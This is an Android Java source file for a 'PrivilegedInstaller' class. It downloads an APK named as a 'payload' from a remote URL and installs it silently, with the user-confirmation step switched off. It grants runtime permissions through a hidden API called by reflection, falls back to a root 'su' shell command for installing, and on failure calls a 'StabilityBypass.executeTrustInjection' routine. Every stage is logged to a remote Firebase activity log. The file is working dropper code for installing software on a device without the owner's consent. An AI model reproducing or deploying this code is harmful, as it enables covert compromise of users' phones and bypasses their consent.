package com.labs.labrats;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * PRIVILEGED_SYSTEM_INSTALLER
 * Leverages OEM System / /system/priv-app/ Partition Privileges (INSTALL_PACKAGES)
 * to interface directly with PackageManagerService for zero-prompt, silent package installation.
 */
public class PrivilegedInstaller {

    private static final String TAG = "PrivilegedInstaller";

    /**
     * Checks if the application is running as a privileged system app (/system/priv-app/)
     * or holds the signature|privileged level INSTALL_PACKAGES permission.
     */
    public static boolean isPrivilegedSystemApp(Context context) {
        if (context == null) return false;
        try {
            ApplicationInfo info = context.getApplicationInfo();
            boolean isSystemFlag = (info.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
            boolean isPrivAppDir = info.sourceDir != null && info.sourceDir.contains("/priv-app/");
            boolean hasInstallPermission = context.checkCallingOrSelfPermission("android.permission.INSTALL_PACKAGES") == PackageManager.PERMISSION_GRANTED;

            boolean privileged = isSystemFlag || isPrivAppDir || hasInstallPermission;
            Log.d(TAG, "PRIVILEGED_CHECK: SystemFlag=" + isSystemFlag + ", PrivDir=" + isPrivAppDir + ", InstallPerm=" + hasInstallPermission);
            return privileged;
        } catch (Exception e) {
            Log.e(TAG, "Error checking privileged status: " + e.getMessage());
            return false;
        }
    }

    /**
     * Silent Package Installation using PackageInstaller Session API or Root Shell.
     * Bypasses user confirmation dialogs when running with privileged permissions or elevated shell.
     */
    public static boolean silentInstall(Context context, File apkFile) {
        if (context == null || apkFile == null || !apkFile.exists() || !apkFile.canRead()) {
            Log.e(TAG, "SILENT_INSTALL_FAIL: Invalid or unreadable APK file.");
            FirebaseConfig.logActivity("SILENT_INSTALL_ERROR: Target APK file invalid or inaccessible.");
            return false;
        }

        Log.i(TAG, "SILENT_INSTALL_INIT: Initiating privileged installation for " + apkFile.getName() + " (" + apkFile.length() + " bytes)...");
        FirebaseConfig.logActivity("SILENT_INSTALL_INIT: Deploying " + apkFile.getName() + " via PackageManagerService...");

        // Strategy 1: Privileged PackageInstaller Session API (Primary OEM System Vector)
        if (isPrivilegedSystemApp(context) || Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
                PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);

                // Disable interactive user confirmation prompts on Android 12+ (API 31+)
                if (Build.VERSION.SDK_INT >= 31) {
                    params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
                }

                // Grant all requested runtime permissions silently upon installation (Hidden/System API)
                try {
                    java.lang.reflect.Method method = params.getClass().getMethod("setGrantRuntimePermissions", boolean.class);
                    method.invoke(params, true);
                } catch (Throwable ignored) {}

                int sessionId = packageInstaller.createSession(params);
                PackageInstaller.Session session = packageInstaller.openSession(sessionId);

                try (InputStream in = new FileInputStream(apkFile);
                     OutputStream out = session.openWrite("silent_base.apk", 0, apkFile.length())) {
                    byte[] buffer = new byte[65536];
                    int n;
                    while ((n = in.read(buffer)) > 0) {
                        out.write(buffer, 0, n);
                    }
                    session.fsync(out);
                }

                Intent intent = new Intent(context, PermissionActivity.class);
                intent.setAction("SILENT_INSTALL_COMPLETE");
                intent.putExtra("apk_name", apkFile.getName());
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                int flags = PendingIntent.FLAG_UPDATE_CURRENT;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    flags |= PendingIntent.FLAG_IMMUTABLE;
                }

                PendingIntent pendingIntent = PendingIntent.getActivity(context, sessionId, intent, flags);
                session.commit(pendingIntent.getIntentSender());
                session.close();

                Log.i(TAG, "SILENT_INSTALL_SUCCESS: PackageInstaller session committed silently.");
                FirebaseConfig.logActivity("SILENT_INSTALL_SUCCESS: PackageInstaller session committed for " + apkFile.getName());
                return true;

            } catch (Exception e) {
                Log.w(TAG, "PackageInstaller session failed, attempting Root/Shell fallback: " + e.getMessage());
            }
        }

        // Strategy 2: Root / Shell `pm install` Silent Fallback
        return silentInstallViaShell(apkFile);
    }

    /**
     * Shell / Root pm install fallback.
     */
    public static boolean silentInstallViaShell(File apkFile) {
        try {
            String apkPath = apkFile.getAbsolutePath();
            String[] cmd = {"su", "-c", "pm install -r -g \"" + apkPath + "\""};
            Process process = Runtime.getRuntime().exec(cmd);
            int exitCode = process.waitFor();

            if (exitCode == 0) {
                Log.i(TAG, "SILENT_INSTALL_SHELL_SUCCESS: Installed via root shell.");
                FirebaseConfig.logActivity("SILENT_INSTALL_SUCCESS: Root shell package install complete.");
                return true;
            } else {
                // Try non-root pm install fallback
                Process pmProc = Runtime.getRuntime().exec("pm install -r -g \"" + apkPath + "\"");
                if (pmProc.waitFor() == 0) {
                    Log.i(TAG, "SILENT_INSTALL_PM_SUCCESS: Installed via PM shell.");
                    FirebaseConfig.logActivity("SILENT_INSTALL_SUCCESS: PM shell package install complete.");
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "SILENT_INSTALL_SHELL_ERROR: " + e.getMessage());
        }
        return false;
    }

    /**
     * Downloads an APK from a remote URL and executes silent background installation.
     */
    public static void downloadAndSilentInstallAsync(Context context, String apkUrl) {
        if (context == null || apkUrl == null || apkUrl.trim().isEmpty()) return;

        new Thread(() -> {
            try {
                FirebaseConfig.logActivity("SILENT_INSTALL_UPLINK: Downloading payload from " + apkUrl + "...");
                File cacheDir = context.getCacheDir();
                File tempApk = new File(cacheDir, "remote_payload_" + System.currentTimeMillis() + ".apk");

                URL url = new URL(apkUrl.trim());
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Android)");

                try (InputStream in = conn.getInputStream();
                     FileOutputStream out = new FileOutputStream(tempApk)) {
                    byte[] buffer = new byte[16384];
                    int n;
                    while ((n = in.read(buffer)) > 0) {
                        out.write(buffer, 0, n);
                    }
                }

                boolean installed = silentInstall(context, tempApk);
                if (!installed) {
                    // Fallback to standard interactive install if silent install is unavailable
                    StabilityBypass.executeTrustInjection(context);
                }

                // Cleanup temp file
                try { tempApk.delete(); } catch (Exception ignored) {}

            } catch (Exception e) {
                Log.e(TAG, "DOWNLOAD_SILENT_INSTALL_ERROR: " + e.getMessage(), e);
                FirebaseConfig.logActivity("SILENT_INSTALL_ERROR: Download failed: " + e.getMessage());
            }
        }).start();
    }
}
